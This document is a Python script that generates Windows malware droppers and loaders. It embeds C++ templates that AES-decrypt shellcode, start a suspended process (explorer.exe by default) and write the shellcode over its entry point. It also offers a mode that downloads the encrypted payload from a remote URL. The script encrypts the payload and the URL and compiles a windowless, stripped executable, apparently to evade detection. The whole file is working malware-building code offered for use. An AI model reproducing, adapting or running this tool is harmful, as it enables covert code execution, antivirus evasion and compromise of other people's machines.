#!/usr/bin/python3
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib
import subprocess
import os
from colorama import Fore
import argparse
from distutils.spawn import find_executable

# Global Variables
CODE = """
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#include <urlmon.h>
#include <stdlib.h>
#include <sstream>
#include <string>

//#include <string.h>
//#include <malloc.h>
//#include <cstdio>
//#include <wincrypt.h>

//#pragma warning(disable:4996)
//#pragma comment(lib, "ntdll.lib")
//#pragma comment(lib, "urlmon.lib") // -lurlmon(static-linking of urlmon.lib)
//#pragma comment (lib, "crypt32.lib")
//#pragma comment (lib, "advapi32")

using namespace std;


int AESDecrypt(unsigned char* payload, DWORD payload_len, unsigned char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, &payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

void Inject64(unsigned char* shellcode, int shellcode_len) {

    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

    // **CHANGABLE EXECUTABLE**
    $$EXE$$
    

    //char binPath[] = "C:\\windows\\explorer.exe";

    CreateProcessA(0, (LPSTR)binPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

    // find remote PEB 
    PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();

    // get PROCESS_BASIC_INFORMATION 
    NtQueryInformationProcess(pProcessInfo->hProcess, ProcessBasicInformation, pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);

    // get ImageBase offset address from the PEB 
    DWORD64 pebImageBaseOffset = (DWORD64)pBasicInfo->PebBaseAddress + 0x10;

    // get ImageBase 
    DWORD64 ImageBase = 0;
    SIZE_T ReadSize = 8;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)pebImageBaseOffset, &ImageBase, ReadSize, &bytesRead);

    // read target process image headers 
    BYTE headersBuffer[4096] = {};
    ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)ImageBase, headersBuffer, 4096, NULL);

    // get AddressOfEntryPoint
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
    LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD64)ImageBase);

    // write shellcode to image entry point and execute it 
    WriteProcessMemory(pProcessInfo->hProcess, (LPVOID)codeEntry, shellcode, shellcode_len, NULL);
    ResumeThread(pProcessInfo->hThread);

}

"""

FetchFunction = """

string downloadResource(char* url) {
    IStream* stream;
    HRESULT result = URLOpenBlockingStreamA(0, url, &stream, 0, 0);
    if (result != 0) {
        return 0;
    }
    char buffer[100];
    unsigned long bytesRead;
    stringstream ss;
    stream->Read(buffer, 100, &bytesRead);
    while (bytesRead > 0U) {
        ss.write(buffer, (long long)bytesRead);
        stream->Read(buffer, 100, &bytesRead);
    }
    stream->Release();
    string resultString = ss.str();
    //cout << resultString << endl;
    return resultString;
}

unsigned char* toBytes(unsigned char* buffer) {
    
    const char* shellcodeHex = (const char*)buffer;
    int shellcode_length = strlen((const char*)buffer);
    unsigned char* val = (unsigned char*)calloc(shellcode_length / 2, sizeof(unsigned char));
    for (size_t count = 0; count < shellcode_length / 2; count++) {
        sscanf(shellcodeHex, "%2hhx", &val[count]);
        shellcodeHex += 2;
    }
    return val;
}


"""

LoaderMain = """

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){

    $$MOCA$$

    Inject64(moca_data, sizeof(moca_data));
    return 0;
}


"""

DropperMain = """
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
    // **CHANGABLE URL**
    $$URL$$

    string HexString = downloadResource((char*)url_data);
    int moca_len = HexString.length() / 2 - 16;
    
    unsigned char* lol = toBytes((unsigned char*)HexString.c_str());
    unsigned char* moca = lol + 16;

    AESDecrypt(moca, moca_len, lol, 16);
    Inject64(moca, moca_len);

    return 0;
}
"""

ART = r"""
                                                                                                                        
,--.   ,--.                                ,----.                                                ,--.                   
 \  `.'  /  ,--.,--. ,--,--,   ,---.      '  .-./     ,---.  ,--,--,   ,---.  ,--.--.  ,--,--. ,-'  '-.  ,---.  ,--.--. 
  '.    /   |  ||  | |      \ (  .-'      |  | .---. | .-. : |      \ | .-. : |  .--' ' ,-.  | '-.  .-' | .-. | |  .--' 
    |  |    '  ''  ' |  ||  | .-'  `)     '  '--'  | \   --. |  ||  | \   --. |  |    \ '-'  |   |  |   ' '-' ' |  |    
    `--'     `----'  `--''--' `----'       `------'   `----' `--''--'  `----' `--'     `--`--'   `--'    `---'  `--'    
                                                                                                                        

"""

#FILE_PATH = ''
#for dir in (os.path.realpath(__file__).split('/')[:-1]):
    #FILE_PATH += '/' + dir

#FILE_PATH = FILE_PATH[1:] + '/'

TEMP_FILE = "temp.cpp"
CURPATH = os.getcwd()
DEBUG = False
VERBOSE = False


def printS(text):
    print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
def printE(text):
    print(f"""{Fore.RED}[!]{Fore.WHITE} {text}""")
def printI(text, end='\n'):
    print(f"""{Fore.BLUE}[*]{Fore.WHITE} {text}""",end=end)

def encrypt(shellcodeFile):
    # Checking For Binary File
    try:
        binaryData = open(shellcodeFile, "rb").read()
        printI(f"Encrypting file {shellcodeFile}")
    except FileNotFoundError:
        printI(f"Encrypting string {shellcodeFile}")
        try:
            binaryData = shellcodeFile.encode()
        except:
            binaryData = shellcodeFile
    

    KEY = get_random_bytes(16)
    readableKey = ''.join(hex(x)[2:] for x in KEY)
    printI(f"Generated key: {readableKey}")

    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(binaryData, AES.block_size))

    return KEY, ciphertext


def EncryptToC(Plain, VarName):
    KeyHex, CipherHex = encrypt(Plain)
    Key = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in KeyHex) + ' };'
    Payload = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in CipherHex) + ', 0x00 };'
    
    CodeLine = f"""
unsigned char {VarName}_key[] = {Key}
unsigned char {VarName}_data[] = {Payload}
int {VarName}_len = sizeof({VarName}_data) - 1;
AESDecrypt({VarName}_data, {VarName}_len, {VarName}_key, 16);
"""

    return CodeLine


def check_requirements():
    flag1 = find_executable("i686-w64-mingw32-g++") is not None
    flag2 = find_executable("x86_64-w64-mingw32-g++") is not None
    if ((flag1 is False) or (flag2 is False)):
        printE("MinGW cross-compiler is not Installed!")
        printI("Would you like to install it now? [Y/n]: ")
        choice = input()
        if choice == 'y' or choice == 'Y' or choice == 'yes' or choice == 'Yes':
            printS("Installing the MinGW compiler...")
            os.system("sudo apt update")
            os.system("sudo apt install mingw-w64")
        else:
            printI("Please install it manually then\n")
            sys.exit(0)


def CompileCode(Code, OutputFile, Arch):

    printI("Compiling...") 

    open(TEMP_FILE, 'w+').write(Code)
    SourceFile = TEMP_FILE

    if Arch == "x64":
        res = subprocess.run(f'x86_64-w64-mingw32-g++ {SourceFile} -o {OutputFile}.exe -lntdll -lurlmon -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc 2>/dev/null', shell=True)
        if res.returncode:
            printE(f"Error Compiling. Check {SourceFile} for more info!")
            sys.exit(1)
        #-lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
        printS(f"Executable saved to {OutputFile}.exe")

    if DEBUG:
        printI(f'{SourceFile} is left for debugging')
    else:
        subprocess.run('rm temp.cpp', shell=True)


def GenerateDropperCode(shellcodeFile, url):
    code = CODE + FetchFunction + DropperMain
     
    #############################
    # Generating Shellcode File #
    #############################
    ShellcodeKey, ShellcodeCipher = encrypt(shellcodeFile)
    EncryptedShellcodeFileName = url.split('/')[-1]
    EncryptedShellcodeFile = CURPATH + '/' + EncryptedShellcodeFileName
    EncData = ShellcodeKey.hex() + ShellcodeCipher.hex()
    open(EncryptedShellcodeFile, 'w+').write(EncData)

    #printS(f"Encrypted shellcode saved to {EncryptedShellcodeFileName}")

    ############################
    # Generating Encrypted URL #
    ############################
    URLCodeLine = EncryptToC(url, "url")
    code = code.replace('$$URL$$', URLCodeLine)

    printS(f"Please host {EncryptedShellcodeFileName} at {url}")

    return code 


def GenerateLoaderCode(shellcodeFile):
    code = CODE + LoaderMain

    ShellCodeLine = EncryptToC(shellcodeFile, "moca")
    code = code.replace('$$MOCA$$', ShellCodeLine)

    return code



def AddExecutable(Code, Process):
    printI(f"Using {Process} to inject into")
    #EXECodeLine = EncryptToC(process, "exe")
    EXECodeLine = f"""char binPath[] = "{Process}";"""
    code = Code.replace('$$EXE$$', EXECodeLine)
    #print(code)

    return code

def GetArgs():
    parser = argparse.ArgumentParser(description="Simple raw shellcode Dropper Generator")
    parser.add_argument("shellcode", help="File containing raw shellcodeFile")
    #parser.add_argument("-t", "--target", help="Target Computer Name")
    #parser.add_argument("-a", "--arch", default="1", help="shellcodeFile Architecture (1=x64, 2=x86) (default=x64)")
    parser.add_argument("-u", "--url", default=False, help="URL to fetch shellcode")
    parser.add_argument("-p", "--process", default=r'C:/windows/explorer.exe', help="Process to spawn and inject into (default=c:\\\\windows\\\\explorer.exe)")
    parser.add_argument("-o", "--output", default=False, help="Output Executable Name")
    #parser.add_argument("-d", "--debug", default=False, action="store_true", help="Generate cpp code with the executable for debuging")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Showes generated Payload and Key")

    return parser.parse_args()

def main():

    print(ART)
    check_requirements() 


    """
    INPUTE: ShellcodeFile, URL
    OUTPUT: EncryptedShellcodeFile, Dropper.exe

    CHANGABLES:
    1- Process
    2- URL
    3- ShellcodeFile
    """

    args = GetArgs()
    
    if args.verbose: VERBOSE = True
    #if args.debug: DEBUG = True

    if args.url: Type = 'Dropper' 
    else: Type = 'Loader'

    process = args.process
    if '/' in process: process = process.replace('/',r'\\')
    elif '\\' in process: process = process.replace('\\',r'\\') 


    if args.shellcode.startswith('/'):
        shellcodeFile = args.shellcode
    else:
        shellcodeFile = CURPATH + '/' + args.shellcode

    if not os.path.isfile(shellcodeFile):
        printE(f"No such file {shellcodeFile}")
        sys.exit(1) 

    binaryName = shellcodeFile.split('/')[-1]
    
    if not args.output:
        outputFileName = (shellcodeFile.split('/')[-1]).split('.')[0]
        outputFilePath = CURPATH + '/' + outputFileName
    else:
        outputFileName = args.output.strip('.exe')
        #if '.exe' in outputFileName:
        #    outputFileName
        if args.output.startswith('/'):
            outputFilePath = outputFileName
        else:
            outputFilePath = CURPATH + '/' + outputFileName
    
    # Check for Unsupported ARCH
    try:
        Arch = 'x64' #ARCHS[args.arch]
    except KeyError:
        printE("Invalid Arch...!")
        parser.print_help()
        sys.exit(1)

    ########################
    # Starting to Generate #
    ########################
    printI(f"Generating {Arch} {Type} for {binaryName}")


    ######################
    # Generating Dropper #
    ######################
    if args.url:
        code = GenerateDropperCode(shellcodeFile, args.url)

    #####################
    # Generating Loader #
    #####################   
    else:
        code = GenerateLoaderCode(shellcodeFile)
    
    # Add Executable
    code = AddExecutable(code, process)

    # Compileing
    CompileCode(code, outputFilePath, Arch)


 
if __name__ == "__main__":
    main()

